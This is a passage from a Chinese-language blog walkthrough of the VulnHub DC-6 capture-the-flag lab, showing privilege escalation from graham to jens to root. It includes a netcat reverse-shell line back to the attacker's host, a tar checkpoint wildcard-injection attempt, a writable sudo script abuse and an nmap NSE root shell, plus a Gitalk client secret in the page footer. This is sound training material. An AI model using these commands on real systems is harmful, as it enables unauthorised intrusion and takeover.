<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/vulnhub/DC/6/workSpace]<br>└─$ ssh graham@192.168.56.115<br>graham@192.168.56.115<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">Linux dc-6 4.9.0-8-amd64 #1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64</span><br><span class="hljs-string"></span><br><span class="hljs-string">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="hljs-string">the exact distribution terms for each program are described in the</span><br><span class="hljs-string">individual files in /usr/share/doc/*/copyright.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="hljs-string">permitted by applicable law.</span><br><span class="hljs-string">graham@dc-6:~$</span><br></code></pre></td></tr></table></figure>

<p>非常的对。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">graham@dc-6:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> graham on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User graham may run the following commands on dc-6:<br>    (jens) NOPASSWD: /home/jens/backups.sh<br></code></pre></td></tr></table></figure>

<p>graham竟然可以以jens身份执行backups.sh。因为用的<code>tar</code>，我们知道有个利用<code>tar --checkpoint</code>提权的方法，我们试着弹个jens的反弹shell回来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@dc-6:/var/www/html$ <span class="hljs-built_in">ls</span> -la<br><span class="hljs-built_in">ls</span> -la<br>total 228<br>-rw-r--r--  1 www-data www-data     1 Jun  3 18:04 --checkpoint-action=<span class="hljs-built_in">exec</span>=sh sujens.sh<br>-rw-r--r--  1 www-data www-data     1 Jun  3 17:55 --checkpoint=1<br>drwxr-xr-x  5 www-data devs      4096 Jun  3 18:04 .<br>drwxr-xr-x  3 root     root      4096 Apr 26  2019 ..<br>-rw-r--r--  1 www-data devs       420 Dec  1  2017 index.php<br>-rw-r--r--  1 www-data devs     19935 Jan  2  2019 license.txt<br>-rw-r--r--  1 www-data devs      7425 Jan  9  2019 readme.html<br>-rwxr-xr-x  1 www-data www-data    35 Jun  3 17:58 sujens.sh<br>-rw-r--r--  1 www-data devs      6919 Jan 12  2019 wp-activate.php<br>drwxr-xr-x  9 www-data devs      4096 Mar 13  2019 wp-admin<br>-rw-r--r--  1 www-data devs       369 Dec  1  2017 wp-blog-header.php<br>-rw-r--r--  1 www-data devs      2283 Jan 21  2019 wp-comments-post.php<br>-rw-r--r--  1 www-data devs      2898 Jan  8  2019 wp-config-sample.php<br>-rw-r--r--  1 www-data devs      3268 Apr 26  2019 wp-config.php<br>drwxr-xr-x  4 www-data devs      4096 Apr 26  2019 wp-content<br>-rw-r--r--  1 www-data devs      3847 Jan  9  2019 wp-cron.php<br>drwxr-xr-x 19 www-data devs     12288 Mar 13  2019 wp-includes<br>-rw-r--r--  1 www-data devs      2502 Jan 16  2019 wp-links-opml.php<br>-rw-r--r--  1 www-data devs      3306 Dec  1  2017 wp-load.php<br>-rw-r--r--  1 www-data devs     38883 Jan 12  2019 wp-login.php<br>-rw-r--r--  1 www-data devs      8403 Dec  1  2017 wp-mail.php<br>-rw-r--r--  1 www-data devs     17947 Jan 30  2019 wp-settings.php<br>-rw-r--r--  1 www-data devs     31085 Jan 17  2019 wp-signup.php<br>-rw-r--r--  1 www-data devs      4764 Dec  1  2017 wp-trackback.php<br>-rw-r--r--  1 www-data devs      3068 Aug 17  2018 xmlrpc.php<br>www-data@dc-6:/var/www/html$ <span class="hljs-built_in">cat</span> sujens.sh<br><span class="hljs-built_in">cat</span> sujens.sh<br>nc 192.168.56.144 443 -e /bin/bash<br></code></pre></td></tr></table></figure>

<p>然而并没有得逞，执行backups.sh没能给我弹回反弹shell。原因可能是需要以通配符形式备份才行，这种直接备份一整个文件夹的可能不行。</p>
<p>那咋整呢。我们仔细观察了一下文件权限<code>-rwxrwxr-x 1 jens devs   50 Apr 26  2019 backups.sh</code>，发现其权限是775，其他用户不能写，但他的组devs可以读写。我们看一下graham的id。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">graham@dc-6:/home/jens$ <span class="hljs-built_in">id</span><br>uid=1001(graham) gid=1001(graham) <span class="hljs-built_in">groups</span>=1001(graham),1005(devs)<br></code></pre></td></tr></table></figure>

<p>惊喜发现其就是属于devs组的。那接下来就简单了，可以直接写入就方便了。直接vim向其中加入<code>/bin/bash</code>,然后sudo以jens身份执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">graham@dc-6:/home/jens$ vim backups.sh <br>graham@dc-6:/home/jens$ <span class="hljs-built_in">cat</span> backups.sh <br><span class="hljs-comment">#!/bin/bash</span><br>tar -czf backups.tar.gz /var/www/html<br>/bin/bash<br>graham@dc-6:/home/jens$ sudo -u jens ./backups.sh<br>tar: Removing leading `/<span class="hljs-string">&#x27; from member names</span><br><span class="hljs-string">jens@dc-6:~$ whoami</span><br><span class="hljs-string">jens</span><br></code></pre></td></tr></table></figure>

<p>我们看看jens的sudo权限，发现可以使用nmap，那我们直接利用nmap的自定义脚本提权。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">jens@dc-6:~$ sudo -l<br>Matching Defaults entries <span class="hljs-keyword">for</span> jens on dc-6:<br>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User jens may run the following commands on dc-6:<br>    (root) NOPASSWD: /usr/bin/nmap<br>jens@dc-6:~$ sudo nmap --interactive<br>nmap: unrecognized option <span class="hljs-string">&#x27;--interactive&#x27;</span><br>See the output of nmap -h <span class="hljs-keyword">for</span> a summary of options.<br>jens@dc-6:~$ TF=$(<span class="hljs-built_in">mktemp</span>)<br>jens@dc-6:~$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; <span class="hljs-variable">$TF</span><br>jens@dc-6:~$ sudo nmap --script=<span class="hljs-variable">$TF</span><br><br>Starting Nmap 7.40 ( https://nmap.org ) at 2023-06-03 18:14 AEST<br>NSE: Warning: Loading <span class="hljs-string">&#x27;/tmp/tmp.tjVS1DLp9J&#x27;</span> -- the recommended file extension is <span class="hljs-string">&#x27;.nse&#x27;</span>.<br>root@dc-6:/home/jens<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p>成功提权。</p>
<p>但此时的shell是有问题的，输入是没有显示的，所以我们盲打一个<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;</code>重新spawn一个bash就可以了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@dc-6:~<span class="hljs-comment"># root@dc-6:~# whoami</span><br>root<br>root@dc-6:~<span class="hljs-comment"># uname -a</span><br>Linux dc-6 4.9.0-8-amd64 <span class="hljs-comment">#1 SMP Debian 4.9.144-3.1 (2019-02-19) x86_64 GNU/Linux</span><br>root@dc-6:~<span class="hljs-comment"># ip a</span><br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:e1:6f:2c brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.115/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fee1:6f2c/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>root@dc-6:~<span class="hljs-comment"># cat theflag.txt</span><br><br><br>Yb        dP 888888 88     88         8888b.   dP<span class="hljs-string">&quot;Yb  88b 88 888888 d8b </span><br><span class="hljs-string"> Yb  db  dP  88__   88     88          8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="hljs-string">  YbdPYbdP   88&quot;</span><span class="hljs-string">&quot;   88  .o 88  .o      8I  dY Yb   dP 88 Y88 88&quot;</span><span class="hljs-string">&quot;   `&quot;</span><span class="hljs-string">&#x27; </span><br><span class="hljs-string">   YP  YP    888888 88ood8 88ood8     8888Y&quot;   YbodP  88  Y8 888888 (8) </span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">Congratulations!!!</span><br><span class="hljs-string"></span><br><span class="hljs-string">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="hljs-string">who have provided feedback, and who have taken time to complete these little</span><br><span class="hljs-string">challenges.</span><br><span class="hljs-string"></span><br><span class="hljs-string">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">root@dc-6:~#</span><br></code></pre></td></tr></table></figure>

<p>完成。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/04/Year-of-the-Jellyfish/">← Next [THM]  Year of the Jellyfish</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/02/DC-5/">[vulnhub]  DC:5 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E5%85%B8%E7%99%BB%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">3.1.</span> <span class="toc-text">字典登录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CLUE"><span class="toc-number">3.2.</span> <span class="toc-text">CLUE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E6%8B%BFshell"><span class="toc-number">3.3.</span> <span class="toc-text">后台拿shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E6%9E%9A%E4%B8%BE"><span class="toc-number">4.1.</span> <span class="toc-text">手动枚举</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#config%E6%96%87%E4%BB%B6"><span class="toc-number">4.2.</span> <span class="toc-text">config文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#home%E7%9B%AE%E5%BD%95"><span class="toc-number">4.3.</span> <span class="toc-text">home目录</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>